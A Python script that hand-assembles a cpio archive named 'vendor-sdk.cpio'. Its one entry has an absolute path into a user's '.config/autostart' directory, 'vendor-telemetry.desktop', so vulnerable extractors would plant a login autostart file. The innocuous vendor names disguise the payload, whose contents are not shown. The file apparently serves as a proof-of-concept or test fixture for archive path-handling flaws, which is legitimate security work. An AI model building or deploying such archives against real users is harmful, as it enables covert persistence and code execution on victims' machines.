#!/usr/bin/env python3
import pathlib
import stat


def entry(name: str, data: bytes, inode: int) -> bytes:
    encoded_name = name.encode() + b"\0"
    fields = [
        inode,
        stat.S_IFREG | 0o644,
        1000,
        1000,
        1,
        0,
        len(data),
        0,
        0,
        0,
        0,
        len(encoded_name),
        0,
    ]
    header = b"070701" + b"".join(f"{value:08x}".encode() for value in fields)
    item = header + encoded_name
    item += b"\0" * ((-len(item)) % 4)
    item += data
    item += b"\0" * ((-len(item)) % 4)
    return item


root = pathlib.Path(__file__).resolve().parent
source = root / "cpio-src/home/stazot/.config/autostart/vendor-telemetry.desktop"
archive = entry(
    "/home/stazot/.config/autostart/vendor-telemetry.desktop",
    source.read_bytes(),
    1,
)
archive += entry("TRAILER!!!", b"", 2)
(root / "vendor-sdk.cpio").write_bytes(archive)
